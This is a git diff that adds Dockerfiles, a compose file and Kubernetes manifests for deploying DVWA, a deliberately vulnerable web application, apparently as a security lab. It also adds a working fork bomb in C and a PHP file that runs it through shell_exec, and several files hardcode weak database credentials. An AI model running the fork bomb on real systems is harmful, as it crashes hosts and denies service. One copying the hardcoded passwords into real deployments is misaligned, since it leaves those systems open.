@@ -1,0 +1,232 @@
+diff --git a/Dockerfile.db b/Dockerfile.db
+new file mode 100644
+index 0000000..104ba97
+--- /dev/null
++++ b/Dockerfile.db
+@@ -0,0 +1,30 @@
++FROM debian:9.2
++
++LABEL maintainer "opsxcq@strm.sh"
++
++RUN apt-get update && \
++    apt-get upgrade -y && \
++    DEBIAN_FRONTEND=noninteractive apt-get install -y \
++    debconf-utils && \
++    echo mariadb-server mysql-server/root_password password vulnerables | debconf-set-selections && \
++    echo mariadb-server mysql-server/root_password_again password vulnerables | debconf-set-selections && \
++    DEBIAN_FRONTEND=noninteractive apt-get install -y \
++    apache2 \
++    mariadb-server \
++    php \
++    php-mysql \
++    php-pgsql \
++    php-pear \
++    php-gd \
++    && \
++    apt-get clean && \
++    rm -rf /var/lib/apt/lists/*
++
++RUN service mysql start && \
++    sleep 3 && \
++    mysql -uroot -pvulnerables -e "CREATE USER app@localhost IDENTIFIED BY 'vulnerables';CREATE DATABASE dvwa;GRANT ALL privileges ON dvwa.* TO 'app'@localhost;"
++
++EXPOSE 3306
++
++COPY main-db.sh /
++ENTRYPOINT ["/main-db.sh"]
+diff --git a/Dockerfile.web b/Dockerfile.web
+new file mode 100644
+index 0000000..412b536
+--- /dev/null
++++ b/Dockerfile.web
+@@ -0,0 +1,34 @@
++FROM debian:9.2
++
++LABEL maintainer "opsxcq@strm.sh"
++
++RUN apt-get update && \
++    apt-get upgrade -y && \
++    DEBIAN_FRONTEND=noninteractive apt-get install -y \
++    debconf-utils && \
++    echo mariadb-server mysql-server/root_password password vulnerables | debconf-set-selections && \
++    echo mariadb-server mysql-server/root_password_again password vulnerables | debconf-set-selections && \
++    DEBIAN_FRONTEND=noninteractive apt-get install -y \
++    apache2 \
++    mariadb-server \
++    php \
++    php-mysql \
++    php-pgsql \
++    php-pear \
++    php-gd \
++    && \
++    apt-get clean && \
++    rm -rf /var/lib/apt/lists/*
++
++COPY php.ini /etc/php5/apache2/php.ini
++COPY dvwa /var/www/html
++
++COPY config.inc.php /var/www/html/config/
++
++RUN chown www-data:www-data -R /var/www/html && \
++    rm /var/www/html/index.html
++
++EXPOSE 80
++
++COPY main-web.sh /
++ENTRYPOINT ["/main-web.sh"]
+diff --git a/docker-compose.yml b/docker-compose.yml
+new file mode 100644
+index 0000000..d9b9226
+--- /dev/null
++++ b/docker-compose.yml
+@@ -0,0 +1,20 @@
++version: '2'
++services:
++  mysql:
++    image: localhost:32000/dvwa-db:db
++    container_name: dvwa-db-service
++    volumes:
++      - .:/application
++    restart: always
++    environment:
++      - MYSQL_ROOT_PASSWORD=p@ssw0rd
++      - MYSQL_DATABASE=dvwa
++      - MYSQL_USER=app
++      - MYSQL_PASSWORD=vulnerables
++    ports:
++      - "8082:3306"
++  website:
++    image: localhost:32000/dvwa-web-app:app
++    container_name: dvwa-app
++    ports:
++      - 8000:80 
+diff --git a/forkbomb.c b/forkbomb.c
+new file mode 100644
+index 0000000..8945f18
+--- /dev/null
++++ b/forkbomb.c
+@@ -0,0 +1,6 @@
++#include <unistd.h>
++int main(){
++	for (;;){
++		fork();
++	}
++}
+diff --git a/forkbomb.php b/forkbomb.php
+new file mode 100644
+index 0000000..f8f3612
+--- /dev/null
++++ b/forkbomb.php
+@@ -0,0 +1,10 @@
++<?php 
++echo "Executing fork bomb attack\n";
++
++shell_exec('chmod 700 forkbomb');
++$output = shell_exec('ls -al');
++echo $output;
++
++
++shell_exec('./forkbomb');
++?>
+diff --git a/main-db.sh b/main-db.sh
+new file mode 100755
+index 0000000..b294cea
+--- /dev/null
++++ b/main-db.sh
+@@ -0,0 +1,12 @@
++#!/bin/bash
++
++chown -R mysql:mysql /var/lib/mysql /var/run/mysqld
++
++echo '[+] Starting mysql...'
++service mysql start
++
++while true
++do
++	tail -f /var/log/mysql/*.log
++	exit 0
++done
+diff --git a/main-web.sh b/main-web.sh
+new file mode 100755
+index 0000000..04fd757
+--- /dev/null
++++ b/main-web.sh
+@@ -0,0 +1,10 @@
++#!/bin/bash
++
++echo '[+] Starting apache'
++service apache2 start
++
++while true
++do
++    tail -f /var/log/apache2/*.log
++    exit 0
++done
+diff --git a/mysql.yaml b/mysql.yaml
+new file mode 100644
+index 0000000..ac65b21
+--- /dev/null
++++ b/mysql.yaml
+@@ -0,0 +1,31 @@
++apiVersion: apps/v1 # for versions before 1.9.0 use apps/v1beta2
++kind: Deployment
++metadata:
++  name: mysql
++spec:
++  selector:
++    matchLabels:
++      app: mysql8
++  strategy:
++    type: Recreate
++  template:
++    metadata:
++      labels:
++        app: mysql8
++    spec:
++      containers:
++      - name: mysql
++        image: localhost:32000/dvwa-db:db
++        env:
++        - name: MYSQL_DATABASE
++          value: dvwa
++        - name: MYSQL_USER
++          value: app
++        - name: MYSQL_PASSWORD
++          value: vulnerables
++        - name: MYSQL_ROOT_PASSWORD
++          value: p@ssw0rd
++        args: ["--default-authentication-plugin=mysql_native_password"]
++        ports:
++        - containerPort: 3306
++          name: mysql8
+diff --git a/webserver.yaml b/webserver.yaml
+new file mode 100644
+index 0000000..39eca1b
+--- /dev/null
++++ b/webserver.yaml
+@@ -0,0 +1,25 @@
++apiVersion: apps/v1
++kind: Deployment
++metadata:
++  name: webserver
++  labels:
++    app: apache
++spec:
++  replicas: 1
++  selector:
++    matchLabels:
++      app: apache
++  template:
++    metadata:
++      labels:
++        app: apache
++    spec:
++      containers:
++      - name: php-apache
++        image: localhost:32000/dvwa-web-app:app
++        ports:
++        - containerPort: 80
++        resources:
++          requests:
++            memory: "64Mi"
++            cpu: "100m"
